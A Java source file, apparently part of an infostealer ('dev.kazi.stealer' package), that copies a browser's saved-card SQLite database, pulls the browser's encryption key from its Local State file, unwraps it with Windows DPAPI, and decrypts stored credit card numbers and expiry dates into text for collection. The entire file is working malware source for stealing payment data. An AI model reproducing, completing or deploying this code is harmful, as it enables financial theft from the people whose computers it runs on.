package dev.kazi.stealer.utils.decrypt.creditcards;

import dev.kazi.stealer.utils.decrypt.DecryptUtil;
import java.util.Arrays;
import java.util.Base64;
import org.json.JSONObject;
import dev.kazi.stealer.utils.Util;
import com.github.windpapi4j.WinDPAPI;
import java.sql.SQLException;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.util.UUID;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.io.File;

public class CreditCardsDecrypt {

    private File CARD_PATH;
    private File LOCAL_STATE_PATH;
    public List<String> CARDS;
    
    public CreditCardsDecrypt(final String path0, final String path1) {
        this.CARD_PATH = new File(path0);
        this.LOCAL_STATE_PATH = new File(path1);
        this.CARDS = new ArrayList<String>();
    }
    
    public String getData() {
        final StringBuilder temp = new StringBuilder();
        this.CARDS.forEach(cc -> temp.append(cc).append("\n"));
        return temp.toString();
    }
    
    public CreditCardsDecrypt getCards() {
        final HashSet<CreditCards> CARDS = new HashSet<CreditCards>();
        Connection connection = null;
        File tempFile = null;
        try {
            tempFile = new File(UUID.randomUUID().toString());
            Files.copy(this.CARD_PATH.toPath(), tempFile.toPath(), new CopyOption[0]);
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
            final Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            final ResultSet resultSet = statement.executeQuery("SELECT * FROM credit_cards");
            while (resultSet.next()) {
                this.parseCards(tempFile, "", CARDS, resultSet);
            }
        }
        catch (final Exception exception) {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception ex) {}
        }
        finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception ex2) {}
        }
        tempFile.delete();
        return this;
    }
    
    private void parseCards(final File cardStore, final String name, final HashSet<CreditCards> cardSet, final ResultSet resultSet) throws SQLException {
        final String ccnum = this.decrypt(resultSet.getBytes(5));
        final String expyr = resultSet.getString(4);
        final String expmn = resultSet.getString(3);
        if (ccnum != null) {
            final String format = "Credit Card Number: " + ccnum + "\nExpires: " + expmn + "/" + expyr + "\n";
            this.CARDS.add(format);
        }
    }
    
    private String decrypt(final byte[] encryptedBytes) {
        byte[] decryptedBytes = null;
        byte[] encryptedValue = encryptedBytes;
        try {
            final boolean isV10 = new String(encryptedValue).startsWith("v10");
            if (WinDPAPI.isPlatformSupported()) {
                final WinDPAPI winDPAPI = WinDPAPI.newInstance(new WinDPAPI.CryptProtectFlag[] { WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN });
                if (!isV10) {
                    decryptedBytes = winDPAPI.unprotectData(encryptedValue);
                }
                else {
                    if (!this.LOCAL_STATE_PATH.exists()) {}
                    final String localState = Util.toString(this.LOCAL_STATE_PATH);
                    final JSONObject jsonObject = new JSONObject(localState);
                    final String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
                    byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBase64);
                    if (!new String(encryptedKeyBytes).startsWith("DPAPI")) {}
                    encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length);
                    final byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
                    if (keyBytes.length != 32) {}
                    final byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "V10".length(), "V10".length() + 12);
                    encryptedValue = Arrays.copyOfRange(encryptedValue, "V10".length() + 12, encryptedValue.length);
                    decryptedBytes = DecryptUtil.getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
                }
            }
        }
        catch (final Exception e) {
            return null;
        }
        if (decryptedBytes == null) {
            return null;
        }
        return new String(decryptedBytes);
    }
}
